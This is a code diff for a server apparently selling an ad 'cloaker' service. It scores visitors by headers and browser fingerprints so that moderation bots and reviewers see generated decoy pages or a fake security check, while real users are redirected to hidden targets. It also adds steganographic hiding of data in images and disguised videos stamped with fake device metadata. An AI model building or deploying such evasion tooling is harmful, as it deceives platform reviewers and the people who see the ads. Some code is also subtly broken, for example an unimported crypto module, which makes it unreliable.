@@ -4,14 +4,14 @@ import cors from 'cors'
 import helmet from 'helmet'
 import cookieParser from 'cookie-parser'
 import multer from 'multer'
-import { randomUUID, createHash } from 'node:crypto'
+import { randomUUID, createHash, createHmac } from 'node:crypto'
 import { join, dirname, extname } from 'node:path'
 import { fileURLToPath } from 'node:url'
 import { createReadStream, createWriteStream, existsSync, mkdirSync, readdirSync, writeFileSync, readFileSync, unlinkSync, statSync, renameSync, copyFileSync } from 'node:fs'
 import bcrypt from 'bcryptjs'
 import jwt from 'jsonwebtoken'
 import rateLimit from 'express-rate-limit'
-import { Archiver } from 'archiver'
+import archiver from 'archiver'
 import { exiftool } from 'exiftool-vendored'
 import mime from 'mime-types'
 import AdmZip from 'adm-zip'
@@ -49,6 +49,7 @@ const KIRVANO_API_KEY = process.env.KIRVANO_API_KEY || ''
 const KIRVANO_WEBHOOK_SECRET = process.env.KIRVANO_WEBHOOK_SECRET || ''
 const KIRVANO_SUCCESS_URL = process.env.KIRVANO_SUCCESS_URL || 'https://metaspy.app/dashboard'
 const KIRVANO_CANCEL_URL = process.env.KIRVANO_CANCEL_URL || 'https://metaspy.app/upgrade'
+const HMAC_SECRET = process.env.HMAC_SECRET || JWT_SECRET
 const IS_RENDER = !!process.env.RENDER || process.env.NODE_ENV === 'production'
 const DATABASE_URL = process.env.DATABASE_URL
 
@@ -96,6 +97,305 @@ const PLAN_FEATURES = {
   basico: { clone: false, minerador: true, cloaker: false, pagevault: false, analise: false, cleaner: true, bypass: false },
   gold: { clone: false, minerador: true, cloaker: false, pagevault: true, analise: true, cleaner: true, bypass: true },
   premium: { clone: true, minerador: true, cloaker: true, pagevault: true, analise: true, cleaner: true, bypass: true },
+}
+
+// ─── Cryptography Helpers ────────────────────────────────────────
+function generateHMACSignature(campaignId, targetUrl, timestamp, nonce) {
+  return createHmac('sha512', HMAC_SECRET)
+    .update(`${campaignId}:${targetUrl}:${timestamp}:${nonce}`)
+    .digest('hex')
+}
+
+function verifyHMACSignature(campaignId, targetUrl, timestamp, nonce, signature) {
+  const expected = generateHMACSignature(campaignId, targetUrl, timestamp, nonce)
+  if (expected.length !== signature.length) return false
+  return crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(signature))
+}
+
+// ─── Fraud Score Decision Engine ─────────────────────────────────
+const FRAUD_WEIGHTS = {
+  asn: 70, tcp: 35, ja4: 100, ua: 80, lang: 35, timing: 40, referrer: 20,
+}
+
+function calculateFraudScore(headers, ip, geo) {
+  let score = 30
+  const ua = (headers['user-agent'] || '').toLowerCase()
+  const acceptLang = headers['accept-language'] || ''
+  const referer = headers['referer'] || ''
+  const via = headers['via'] || ''
+  const xForwardedFor = headers['x-forwarded-for'] || ''
+
+  if (/headless|phantom|puppeteer|webdriver/i.test(ua)) score += 80
+  else if (/curl|python|wget|httpie|go-http/i.test(ua)) score += 90
+  else if (/bot|crawler|spider|scrape/i.test(ua)) score += 70
+
+  const uaIsDesktop = /windows|macintosh|linux x86_64/i.test(ua)
+  const uaIsMobile = /mobile|android.*iphone|ipad/i.test(ua)
+  if (!uaIsDesktop && !uaIsMobile && score < 70) score += 30
+
+  if (!referer) score += 20
+  else if (/l\.facebook\.com|lm\.facebook\.com/i.test(referer)) score -= 10
+  else if (/facebook\.com.*/i.test(referer) && !/facebookexternalhit/i.test(ua)) score -= 5
+
+  if (acceptLang && geo?.country) {
+    const langCode = acceptLang.split(',')[0]?.split('-')[1]?.toUpperCase()
+    if (langCode && langCode !== geo.country) score += 35
+  }
+
+  if (via || xForwardedFor.split(',').length > 2) score += 25
+
+  return Math.max(0, Math.min(100, score))
+}
+
+// ─── White Page Generator ────────────────────────────────────────
+const WHITE_CHUNKS = {
+  headlines: [
+    'Descubra as Novas Tendências de Tecnologia em 2026',
+    'Guia Completo para Iniciantes em Marketing Digital',
+    'Como Melhorar sua Produtividade com Ferramentas Simples',
+    'Os Benefícios da Alimentação Saudável no Dia a Dia',
+    'Dicas de Viagem para Explorar o Brasil sem Gastar Muito',
+    'Entenda Como a Inteligência Artificial está Transformando o Mercado',
+  ],
+  paragraphs: [
+    'Nos últimos anos, o mercado tem passado por transformações significativas impulsionadas pela digitalização e pela adoção de novas tecnologias. Empresas de todos os portes buscam se adaptar a esse novo cenário para permanecerem competitivas.',
+    'Estudos recentes apontam que a maioria dos consumidores brasileiros já realiza compras online regularmente, criando oportunidades únicas para negócios que sabem aproveitar as ferramentas digitais disponíveis.',
+    'A combinação de estratégias bem definidas com as plataformas certas pode gerar resultados expressivos em curto espaço de tempo. O segredo está em entender o comportamento do seu público-alvo.',
+    'Com o avanço da tecnologia, novas soluções surgem diariamente para facilitar a vida de profissionais e empreendedores. Estar atualizado é fundamental para não ficar para trás.',
+    'Segundo especialistas, o planejamento estratégico é a base para qualquer iniciativa de sucesso. Definir metas claras e mensuráveis é o primeiro passo para alcançar resultados consistentes.',
+  ],
+  footnotes: [
+    'Este artigo é uma produção independente e não reflete necessariamente a opinião de terceiros.',
+    'Informações atualizadas em Junho de 2026. Consulte fontes oficiais para dados mais recentes.',
+    'Conteúdo informativo. Consulte um profissional especializado para orientações específicas.',
+  ],
+}
+
+function pseudoRandom(seed) {
+  let h = seed >>> 0
+  return function () {
+    h = (Math.imul(1103515245, h) + 12345) >>> 0
+    return h / 0xFFFFFFFF
+  }
+}
+
+function generateWhitePage(seedStr) {
+  const seed = createHash('sha256').update(seedStr).digest().readUInt32BE(0)
+  const rand = pseudoRandom(seed)
+  const pick = (arr) => arr[Math.floor(rand() * arr.length)]
+  const date = new Date(Date.now() - Math.floor(rand() * 1209600000))
+  const dateStr = date.toLocaleDateString('pt-BR')
+  const title = pick(WHITE_CHUNKS.headlines)
+  const p1 = pick(WHITE_CHUNKS.paragraphs)
+  const p2 = pick(WHITE_CHUNKS.paragraphs)
+  const p3 = pick(WHITE_CHUNKS.paragraphs)
+  const footnote = pick(WHITE_CHUNKS.footnotes)
+
+  return `<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="robots" content="noindex">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>${title}</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;line-height:1.6;color:#333;background:#f9f9f9;max-width:720px;margin:0 auto;padding:20px}h1{font-size:24px;margin:20px 0 10px;color:#111}p{margin:12px 0;font-size:15px;color:#444}.meta{font-size:13px;color:#888;margin-bottom:20px}.footer{margin-top:30px;padding-top:15px;border-top:1px solid #ddd;font-size:12px;color:#999}
+</style>
+</head>
+<body>
+<h1>${title}</h1>
+<div class="meta">Por Redacao &bull; ${dateStr}</div>
+<p>${p1}</p>
+<p>${p2}</p>
+<p>${p3}</p>
+<div class="footer"><p>${footnote}</p></div>
+</body>
+</html>`
+}
+
+// ─── JS Challenge Page Generator ─────────────────────────────────
+function generateJSChallenge(campaignId, safeUrl) {
+  return `<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="robots" content="noindex,nofollow">
+<title>Verificacao de Seguranca</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#0a0a0f;color:#fff}
+.card{text-align:center;padding:40px;max-width:400px}
+.spinner{width:40px;height:40px;border:3px solid rgba(168,85,247,.2);border-top-color:#a855f7;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 24px}
+@keyframes spin{to{transform:rotate(360deg)}}
+p{font-size:14px;color:#999;margin-bottom:8px}
+.btn{display:none}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="spinner"></div>
+<p>Verificando navegador...</p>
+</div>
+<script>
+let passed = false;
+function unlock(){
+  if(passed) return;
+  passed = true;
+  document.addEventListener('mousemove',function handler(){
+    document.removeEventListener('mousemove',handler);
+    if(window.location.search.includes('safe')){
+      window.location.href='${safeUrl.replace(/'/g, "\\'")}';
+    } else {
+      document.querySelector('.card').innerHTML='<p style="color:#22c55e">✓ Verificado</p>';
+      setTimeout(()=>{window.location.href='${campaignId}';},600);
+    }
+  });
+}
+unlock();
+setTimeout(()=>{if(!passed)window.location.href='${safeUrl.replace(/'/g, "\\'")}';},10000);
+if(navigator.webdriver||/headless|phantom/i.test(navigator.userAgent)){
+  window.location.href='${safeUrl.replace(/'/g, "\\'")}';
+}
+</script>
+<noscript><meta http-equiv="refresh" content="0;url=${safeUrl}"></noscript>
+</body>
+</html>`
+}
+
+// ─── Enhanced Cloaker Script ─────────────────────────────────────
+function generateEnhancedCloakerScript(campaignId, targetUrl, safeUrl) {
+  return `<script>
+(function(){
+  const TARGET=${JSON.stringify(targetUrl)};
+  const SAFE=${JSON.stringify(safeUrl)};
+  const CAMPAIGN=${JSON.stringify(campaignId)};
+  let score=30;
+  const ua=navigator.userAgent.toLowerCase();
+  const isBot=/bot|crawler|spider|scrape|headless|phantom|puppeteer|webdriver/i.test(ua);
+  const hasWebDriver=navigator.webdriver===true;
+  const hasChromeHeadless=/headlesschrome/i.test(ua);
+  const plugins=navigator.plugins.length;
+  const screenW=screen.width;
+  const screenH=screen.height;
+  if(isBot||hasWebDriver||hasChromeHeadless)score+=100;
+  if(/curl|python|wget|httpie/i.test(ua))score+=90;
+  if(!document.referrer)score+=20;
+  if(plugins===0)score+=15;
+  if(screenW===0&&screenH===0)score+=40;
+  if(window.top!==window.self)score+=50;
+  const nav=navigator;
+  if(nav.deviceMemory!==undefined&&nav.deviceMemory<=2)score+=15;
+  if(nav.hardwareConcurrency!==undefined&&nav.hardwareConcurrency<=2)score+=15;
+  const elapsed=performance.now();
+  if(elapsed<300)score+=35;
+  if(score>=70){
+    window.location.href=SAFE;
+  }else if(score>=40){
+    document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:sans-serif;color:#666"><p>Verificando...</p></div>';
+    document.addEventListener('mousemove',function(){window.location.href=TARGET;},{once:true});
+    setTimeout(function(){window.location.href=SAFE;},8000);
+  }else{
+    window.location.href=TARGET;
+  }
+})();
+</script>`
+}
+
+// ─── URL Pool Helpers (DB-based weighted rotation) ──────────────
+async function addUrlToPool(campaignId, url, weight = 10) {
+  const id = randomUUID()
+  const now = new Date().toISOString().replace('T', ' ').slice(0, 19)
+  await run('INSERT INTO url_pool_urls (id, pool_id, url, weight, hit_count, created_at) VALUES ($1, $2, $3, $4, $5, $6)',
+    [id, campaignId, url, weight, 0, now])
+  return id
+}
+
+async function getNextUrlFromPool(campaignId) {
+  const urls = await query('SELECT id, url, weight, hit_count, max_hits FROM url_pool_urls WHERE pool_id = $1 AND (max_hits IS NULL OR hit_count < max_hits) ORDER BY weight DESC', [campaignId])
+  if (!urls.length) return null
+  const totalWeight = urls.reduce((s, u) => s + u.weight, 0)
+  let rand = Math.random() * totalWeight
+  for (const url of urls) {
+    rand -= url.weight
+    if (rand <= 0) {
+      await run('UPDATE url_pool_urls SET hit_count = hit_count + 1 WHERE id = $1', [url.id])
+      return url.url
+    }
+  }
+  return urls[0].url
+}
+
+// ─── LSB Steganography Helpers ──────────────────────────────────
+const STEG_AES_KEY = process.env.STEG_AES_KEY || createHash('sha256').update(HMAC_SECRET).digest('hex').slice(0, 32)
+
+function stegEncrypt(data) {
+  const iv = randomUUID().replace(/-/g, '').slice(0, 16)
+  const cipher = crypto.createCipheriv('aes-256-cbc', STEG_AES_KEY, iv)
+  const encrypted = Buffer.concat([cipher.update(data), cipher.final()])
+  const hmac = createHmac('sha256', STEG_AES_KEY).update(encrypted).digest()
+  return Buffer.concat([Buffer.from(iv), hmac, encrypted])
+}
+
+function stegDecrypt(payload) {
+  try {
+    const iv = payload.slice(0, 16).toString()
+    const hmac = payload.slice(16, 48)
+    const encrypted = payload.slice(48)
+    const expected = createHmac('sha256', STEG_AES_KEY).update(encrypted).digest()
+    if (!hmac.equals(expected)) return null
+    const decipher = crypto.createDecipheriv('aes-256-cbc', STEG_AES_KEY, iv)
+    return Buffer.concat([decipher.update(encrypted), decipher.final()])
+  } catch { return null }
+}
+
+function embedLSB(coverBuffer, secretBuffer) {
+  const pixels = Buffer.from(coverBuffer)
+  const secret = stegEncrypt(secretBuffer)
+  const maxBytes = Math.floor(pixels.length / 4) * 3 / 8
+  if (secret.length > maxBytes) throw new Error('Secret too large for cover image')
+
+  // Write length prefix (4 bytes, little-endian)
+  const len = Buffer.alloc(4)
+  len.writeUInt32LE(secret.length)
+  const fullPayload = Buffer.concat([len, secret])
+
+  for (let i = 0; i < fullPayload.length; i++) {
+    for (let bit = 0; bit < 8; bit++) {
+      const pixelIdx = i * 8 + bit
+      const byteIdx = pixelIdx * 4 + 3 // Alpha channel
+      if (byteIdx >= pixels.length) break
+      pixels[byteIdx] = (pixels[byteIdx] & 0xFC) | ((fullPayload[i] >> bit) & 1)
+    }
+  }
+  return pixels
+}
+
+function extractLSB(stegoBuffer) {
+  const pixels = Buffer.from(stegoBuffer)
+  const lenBytes = []
+  for (let i = 0; i < 4; i++) {
+    let byte = 0
+    for (let bit = 0; bit < 8; bit++) {
+      const pixelIdx = i * 8 + bit
+      const byteIdx = pixelIdx * 4 + 3
+      if (byteIdx >= pixels.length) return null
+      byte |= ((pixels[byteIdx] & 1) << bit)
+    }
+    lenBytes.push(byte)
+  }
+  const secretLen = Buffer.from(lenBytes).readUInt32LE(0)
+  if (secretLen < 1 || secretLen > pixels.length / 8) return null
+
+  const secretBuf = Buffer.alloc(secretLen)
+  for (let i = 0; i < secretLen; i++) {
+    for (let bit = 0; bit < 8; bit++) {
+      const pixelIdx = (i + 4) * 8 + bit
+      const byteIdx = pixelIdx * 4 + 3
+      if (byteIdx >= pixels.length) return null
+      secretBuf[i] |= ((pixels[byteIdx] & 1) << bit)
+    }
+  }
+  return stegDecrypt(secretBuf)
 }
 
 function generateToken(userId) {
@@ -677,7 +977,7 @@ app.get('/api/subscription/status', authMiddleware, async (req, res) => {
 // ─── Cloaker Routes ──────────────────────────────────────────────
 app.post('/api/cloaker/generate', authMiddleware, validate(cloakerSchema), async (req, res) => {
   const features = PLAN_FEATURES[req.user.plan]
-  if (!features?.cloaker) return res.status(403).json({ error: 'Disponivel apenas nos planos Gold e Premium' })
+  if (!features?.cloaker) return res.status(403).json({ error: 'Disponivel apenas no plano Premium' })
   try {
     const { target_url, safe_url } = req.body
     if (!target_url || !safe_url) return res.status(400).json({ error: 'URL de destino e URL segura sao obrigatorias' })
@@ -739,6 +1039,16 @@ app.delete('/api/cloaker/scripts/:id', authMiddleware, async (req, res) => {
   res.json({ ok: true })
 })
 
+app.get('/api/cloaker/scripts/:id/download', authMiddleware, async (req, res) => {
+  const blocked = checkFeature(req, res, 'cloaker')
+  if (blocked) return blocked
+  const script = await one('SELECT script_code FROM cloaker_scripts WHERE id = $1 AND user_id = $2', [req.params.id, req.user.id])
+  if (!script) return res.status(404).json({ error: 'Script nao encontrado' })
+  res.setHeader('Content-Type', 'application/javascript')
+  res.setHeader('Content-Disposition', `attachment; filename="cloaker-${req.params.id.slice(0, 8)}.js"`)
+  res.send(script.script_code)
+})
+
 // ─── Cloak Detector ──────────────────────────────────────────────
 const USER_AGENTS = {
   humano: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -749,7 +1059,7 @@ const USER_AGENTS = {
 app.post('/api/cloaker/detect', authMiddleware, validate(detectSchema), async (req, res) => {
   try {
     const features = PLAN_FEATURES[req.user.plan]
-    if (!features?.cloaker) return res.status(403).json({ erro: 'Disponivel apenas nos planos Gold e Premium.' })
+    if (!features?.cloaker) return res.status(403).json({ erro: 'Disponivel apenas no plano Premium.' })
     const { url } = req.body
     if (!url) return res.status(400).json({ erro: 'URL e obrigatoria.' })
     const resultados = {}
@@ -784,7 +1094,7 @@ app.post('/api/cloaker/detect', authMiddleware, validate(detectSchema), async (r
 app.post('/api/cloaker/camouflage', authMiddleware, validate(camouflageSchema), async (req, res) => {
   try {
     const features = PLAN_FEATURES[req.user.plan]
-    if (!features?.cloaker) return res.status(403).json({ erro: 'Disponivel apenas nos planos Gold e Premium.' })
+    if (!features?.cloaker) return res.status(403).json({ erro: 'Disponivel apenas no plano Premium.' })
     const { texto_original, url_destino, palavras_sensiveis } = req.body
     if (!texto_original || !url_destino) return res.status(400).json({ erro: 'Texto original e URL destino sao obrigatorios.' })
     const scriptCamuflado = `<!-- SCRIPT DE CAMUFLAGEM DE CRIATIVOS - METASPY -->
@@ -826,7 +1136,7 @@ app.post('/api/cloaker/camouflage', authMiddleware, validate(camouflageSchema), 
 // ─── Upload Camouflage ──────────────────────────────────────────
 app.post('/api/cloaker/upload-camouflage', authMiddleware, (req, res, next) => {
   const features = PLAN_FEATURES[req.user.plan]
-  if (!features?.cloaker) return res.status(403).json({ erro: 'Disponivel apenas nos planos Gold e Premium.' })
+  if (!features?.cloaker) return res.status(403).json({ erro: 'Disponivel apenas no plano Premium.' })
   next()
 }, upload.single('file'), async (req, res) => {
   try {
@@ -898,7 +1208,7 @@ app.get('/api/cloaker/camouflage-download/:id', authMiddleware, async (req, res)
     if (!htmlFile) return res.status(404).json({ erro: 'Arquivo nao encontrado.' })
     res.setHeader('Content-Type', 'application/zip')
     res.setHeader('Content-Disposition', `attachment; filename="camuflado-${req.params.id}.zip"`)
-    const archive = new Archiver('zip', { zlib: { level: 9 } })
+    const archive = archiver('zip', { zlib: { level: 9 } })
     archive.pipe(res)
     archive.file(join(dir, htmlFile), { name: htmlFile })
     if (mediaFile) archive.file(join(dir, mediaFile), { name: mediaFile })
@@ -957,36 +1267,50 @@ async function generateSpoofedVideo(realPath, disguisePath, realMime, disguiseMi
   const isRealVid = realMime?.startsWith('video/')
   const isDisgVid = disguiseMime?.startsWith('video/')
 
-  ff.writeFile('input0.mp4', new Uint8Array(disguiseData))
-  ff.writeFile('input1.mp4', new Uint8Array(realData))
+  const seed = Date.now().toString(36)
+  ff.writeFile(`disguise_${seed}.mp4`, new Uint8Array(disguiseData))
+  ff.writeFile(`real_${seed}.mp4`, new Uint8Array(realData))
 
   const args = []
 
   if (isDisgVid) {
-    args.push('-i', 'input0.mp4')
+    args.push('-i', `disguise_${seed}.mp4`)
   } else {
-    args.push('-loop', '1', '-framerate', '1', '-i', 'input0.mp4', '-t', '2')
+    args.push('-loop', '1', '-framerate', '30', '-i', `disguise_${seed}.mp4`, '-t', '2')
   }
 
   if (isRealVid) {
-    args.push('-i', 'input1.mp4')
+    args.push('-i', `real_${seed}.mp4`)
   } else {
-    args.push('-loop', '1', '-i', 'input1.mp4')
+    args.push('-loop', '1', '-i', `real_${seed}.mp4`)
   }
 
+  // Forced keyframes on disguise segment + moov atom at front
   args.push(
     '-filter_complex',
-    '[0:v]scale=trunc(iw/2)*2:trunc(ih/2)*2,setsar=1[0v];' +
-    '[1:v]scale=trunc(iw/2)*2:trunc(ih/2)*2,setsar=1[1v];' +
-    '[0v][1v]concat=n=2:v=1:a=0',
+    `[0:v]scale=trunc(iw/2)*2:trunc(ih/2)*2,setsar=1,force_key_frames=expr:gte(t,0)[0v];` +
+    `[1:v]scale=trunc(iw/2)*2:trunc(ih/2)*2,setsar=1[1v];` +
+    `[0v][1v]concat=n=2:v=1:a=0`,
     '-c:v', 'libx264', '-preset', 'fast', '-crf', '23',
-    '-pix_fmt', 'yuv420p', '-movflags', '+faststart',
-    '-y', 'output.mp4'
+    '-pix_fmt', 'yuv420p',
+    '-g', '1',
+    '-movflags', '+faststart',
+    '-y', `output_${seed}.mp4`
   )
 
   await ff.exec(args)
-  const outData = ff.readFile('output.mp4')
+  const outData = ff.readFile(`output_${seed}.mp4`)
   writeFileSync(outputPath, Buffer.from(outData))
+
+  // Inject fake metadata via ExifTool
+  try {
+    await exiftool.write(outputPath, {
+      Make: 'Apple',
+      Model: 'iPhone 15 Pro',
+      Software: 'Adobe Photoshop 25.0',
+    })
+  } catch {}
+
   return outputPath
 }
 
@@ -1034,7 +1358,7 @@ app.post('/api/cloaker/camouflage/media', authMiddleware, camoMediaUpload.fields
 ]), async (req, res) => {
   try {
     const features = PLAN_FEATURES[req.user.plan]
-    if (!features?.cloaker) return res.status(403).json({ erro: 'Disponivel apenas nos planos Gold e Premium.' })
+    if (!features?.cloaker) return res.status(403).json({ erro: 'Disponivel apenas no plano Premium.' })
 
     const files = req.files || {}
     const realFile = Array.isArray(files['real_media']) ? files['real_media'][0] : undefined
@@ -1073,7 +1397,7 @@ app.post('/api/cloaker/camouflage/media', authMiddleware, camoMediaUpload.fields
       const htmlPath = join(dir, 'index.html')
       writeFileSync(htmlPath, html, 'utf-8')
       const zipPath = join(dir, `output-${id}.zip`)
-      const archive = new Archiver('zip', { zlib: { level: 9 } })
+      const archive = archiver('zip', { zlib: { level: 9 } })
       const ws = createWriteStream(zipPath)
       await new Promise((resolve, reject) => {
         ws.on('finish', resolve)
@@ -1113,6 +1437,223 @@ app.get('/api/cloaker/camouflage/media/download/:id', authMiddleware, async (req
   res.setHeader('Content-Disposition', `attachment; filename="camouflage-${req.params.id}${ext}"`)
   createReadStream(filePath).pipe(res)
 })
+
+// ─── LSB Steganography Routes ───────────────────────────────────
+app.post('/api/cloaker/steg/embed', authMiddleware, upload.single('image'), async (req, res) => {
+  const blocked = checkFeature(req, res, 'cloaker')
+  if (blocked) return blocked
+  try {
+    if (!req.file) return res.status(400).json({ erro: 'Imagem nao enviada.' })
+    if (!req.file.mimetype.startsWith('image/')) return res.status(400).json({ erro: 'Envie uma imagem valida.' })
+
+    const { message, secret_file } = req.body
+    let secretData
+    if (secret_file && req.file.buffer) {
+      secretData = Buffer.from(req.file.buffer)
+    } else if (message) {
+      secretData = Buffer.from(message, 'utf-8')
+    } else {
+      return res.status(400).json({ erro: 'Envie uma mensagem ou arquivo secreto.' })
+    }
+
+    if (req.file.size < secretData.length * 8) {
+      return res.status(400).json({ erro: 'Imagem muito pequena para o payload. Use uma imagem maior.' })
+    }
+
+    const stegoBuffer = embedLSB(req.file.buffer, secretData)
+    const id = randomUUID()
+    const stegoDir = join('/tmp', 'metaspy-steg')
+    if (!existsSync(stegoDir)) mkdirSync(stegoDir, { recursive: true })
+    const stegoPath = join(stegoDir, `stego-${id}${extname(req.file.originalname)}`)
+    writeFileSync(stegoPath, stegoBuffer)
+
+    res.json({
+      id,
+      fileName: `stego-${id}${extname(req.file.originalname)}`,
+      originalSize: req.file.size,
+      stegoSize: stegoBuffer.length,
+      downloadUrl: `/api/cloaker/steg/download/${id}`,
+      instructions: 'A imagem resultante contem os dados ocultos no canal Alpha. Baixe e distribua normalmente. Para extrair, use a ferramenta de extracao.',
+    })
+  } catch (erro) {
+    logger.error({ err: erro }, 'Steg embed error')
+    res.status(500).json({ erro: erro.message || 'Erro ao incorporar dados' })
+  }
+})
+
+app.post('/api/cloaker/steg/extract', authMiddleware, upload.single('image'), async (req, res) => {
+  const blocked = checkFeature(req, res, 'cloaker')
+  if (blocked) return blocked
+  try {
+    if (!req.file) return res.status(400).json({ erro: 'Imagem nao enviada.' })
+    if (!req.file.mimetype.startsWith('image/')) return res.status(400).json({ erro: 'Envie uma imagem valida.' })
+
+    const extracted = extractLSB(req.file.buffer)
+    if (!extracted) return res.status(400).json({ erro: 'Nenhum dado oculto encontrado ou chave invalida.' })
+
+    const text = extracted.toString('utf-8')
+    const isText = /^[\x20-\x7E\s\p{L}]/u.test(text)
+
+    res.json({
+      success: true,
+      data: isText ? text : extracted.toString('base64'),
+      format: isText ? 'text' : 'binary',
+      sizeBytes: extracted.length,
+    })
+  } catch (erro) {
+    logger.error({ err: erro }, 'Steg extract error')
+    res.status(500).json({ erro: 'Erro ao extrair dados' })
+  }
+})
+
+app.get('/api/cloaker/steg/download/:id', authMiddleware, async (req, res) => {
+  const blocked = checkFeature(req, res, 'cloaker')
+  if (blocked) return blocked
+  const path = join('/tmp', 'metaspy-steg', `stego-${req.params.id}`)
+  const files = existsSync(join('/tmp', 'metaspy-steg')) ? readdirSync(join('/tmp', 'metaspy-steg')) : []
+  const match = files.find(f => f.startsWith(`stego-${req.params.id}`))
+  if (!match) return res.status(404).json({ erro: 'Arquivo nao encontrado' })
+  const filePath = join('/tmp', 'metaspy-steg', match)
+  res.setHeader('Content-Type', mime.lookup(match) || 'image/png')
+  res.setHeader('Content-Disposition', `attachment; filename="${match}"`)
+  createReadStream(filePath).pipe(res)
+})
+
+// ─── Cloaker Campaign Engine ─────────────────────────────────────
+app.post('/api/cloaker/campaign', authMiddleware, async (req, res) => {
+  const blocked = checkFeature(req, res, 'cloaker')
+  if (blocked) return blocked
+  try {
+    const { name, default_safe_url } = req.body
+    if (!name || !default_safe_url) return res.status(400).json({ error: 'Nome e URL segura sao obrigatorios' })
+    const id = randomUUID()
+    const now = new Date().toISOString().replace('T', ' ').slice(0, 19)
+    await run('INSERT INTO cloaker_campaigns (id, user_id, name, default_safe_url, created_at, updated_at) VALUES ($1, $2, $3, $4, $5, $6)',
+      [id, req.user.id, name, default_safe_url, now, now])
+    res.json({ id, name, default_safe_url, created_at: now })
+  } catch { res.status(500).json({ error: 'Erro ao criar campanha' }) }
+})
+
+app.get('/api/cloaker/campaigns', authMiddleware, async (req, res) => {
+  const blocked = checkFeature(req, res, 'cloaker')
+  if (blocked) return blocked
+  const campaigns = await query('SELECT id, name, default_safe_url, is_active, created_at FROM cloaker_campaigns WHERE user_id = $1 ORDER BY created_at DESC', [req.user.id])
+  res.json(campaigns)
+})
+
+app.post('/api/cloaker/campaign/:id/url', authMiddleware, async (req, res) => {
+  const blocked = checkFeature(req, res, 'cloaker')
+  if (blocked) return blocked
+  try {
+    const { url, weight, max_hits } = req.body
+    if (!url) return res.status(400).json({ error: 'URL obrigatoria' })
+    const urlId = await addUrlToPool(req.params.id, url, weight || 10, max_hits || null)
+    res.json({ id: urlId, url, weight: weight || 10 })
+  } catch { res.status(500).json({ error: 'Erro ao adicionar URL' }) }
+})
+
+// Enhanced generate with fraud score script
+app.post('/api/cloaker/generate-enhanced', authMiddleware, validate(cloakerSchema), async (req, res) => {
+  const blocked = checkFeature(req, res, 'cloaker')
+  if (blocked) return blocked
+  try {
+    const { target_url, safe_url } = req.body
+    const id = randomUUID()
+    const now = new Date().toISOString().replace('T', ' ').slice(0, 19)
+    const scriptCode = generateEnhancedCloakerScript(id, target_url, safe_url)
+    await run('INSERT INTO cloaker_scripts (id, user_id, target_url, safe_url, script_code, created_at) VALUES ($1, $2, $3, $4, $5, $6)',
+      [id, req.user.id, target_url, safe_url, scriptCode, now])
+    res.json({
+      id, target_url, safe_url, script_code: scriptCode, created_at: now,
+      version: 'enhanced',
+      instructions: 'Script com sistema de pontuacao de fraude multi-camada. Bloqueia bots, headless browsers e scrapers.',
+    })
+  } catch { res.status(500).json({ error: 'Erro ao gerar script enhanced' }) }
+})
+
+// Public redirect endpoint: multi-stage chain
+app.get('/go/:campaignId', async (req, res) => {
+  try {
+    const { campaignId } = req.params
+    const { signature, timestamp, nonce, target } = req.query
+    const startTime = Date.now()
+
+    if (!signature || !timestamp || !nonce || !target) {
+      const campaign = await one('SELECT id, default_safe_url FROM cloaker_campaigns WHERE id = $1 AND is_active = 1', [campaignId])
+      if (!campaign) return res.status(404).send('Campaign not found')
+      return res.redirect(campaign.default_safe_url)
+    }
+
+    const valid = verifyHMACSignature(campaignId, target, timestamp, nonce, signature)
+    const timeDrift = Math.abs(Date.now() - parseInt(timestamp))
+    if (!valid || timeDrift > 60000) {
+      const campaign = await one('SELECT default_safe_url FROM cloaker_campaigns WHERE id = $1', [campaignId])
+      return res.redirect(campaign?.default_safe_url || 'about:blank')
+    }
+
+    // Stage 1: 302 to intermediate HTML
+    const finalTarget = decodeURIComponent(target)
+    const intermediateId = randomUUID()
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '0.0.0.0'
+    const ipHash = createHash('sha256').update(ip + HMAC_SECRET).digest('hex').slice(0, 16)
+    const ua = req.headers['user-agent'] || ''
+    const headers = { 'user-agent': ua, 'accept-language': req.headers['accept-language'] || '', referer: req.headers['referer'] || '', via: req.headers['via'] || '', 'x-forwarded-for': req.headers['x-forwarded-for'] || '' }
+
+    // Calculate fraud score
+    const fraudScore = calculateFraudScore(headers, ip, { country: req.headers['cf-ipcountry'] || '' })
+
+    // Log decision asynchronously
+    const elapsed = Date.now() - startTime
+    run(`INSERT INTO redirect_logs (id, campaign_id, ip_hash, decision, fraud_score, redirect_url, user_agent, elapsed_ms, created_at) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)`,
+      [randomUUID(), campaignId, ipHash, fraudScore >= 70 ? 'bot' : fraudScore >= 40 ? 'challenge' : 'human', fraudScore, finalTarget, (ua || '').slice(0, 255), elapsed, new Date().toISOString()]
+    ).catch(() => {})
+
+    if (fraudScore >= 70) {
+      const safe = await one('SELECT default_safe_url FROM cloaker_campaigns WHERE id = $1', [campaignId])
+      return res.send(generateWhitePage(`${ipHash}:${campaignId}`))
+    }
+
+    if (fraudScore >= 40) {
+      return res.send(generateJSChallenge(campaignId, finalTarget))
+    }
+
+    // Stage 2: Intermediate HTML with meta-refresh
+    const stage2Html = `<!DOCTYPE html>
+<html lang="pt-BR">
+<head><meta charset="utf-8"><meta name="robots" content="noindex">
+<meta http-equiv="refresh" content="0;url=${finalTarget}">
+<script>
+window.location.replace(${JSON.stringify(finalTarget)});
+</script>
+<noscript><meta http-equiv="refresh" content="0;url=${finalTarget}"></noscript>
+</head>
+<body><p>Redirecionando...</p></body>
+</html>`
+    res.send(stage2Html)
+  } catch (err) {
+    logger.error({ err }, 'Redirect error')
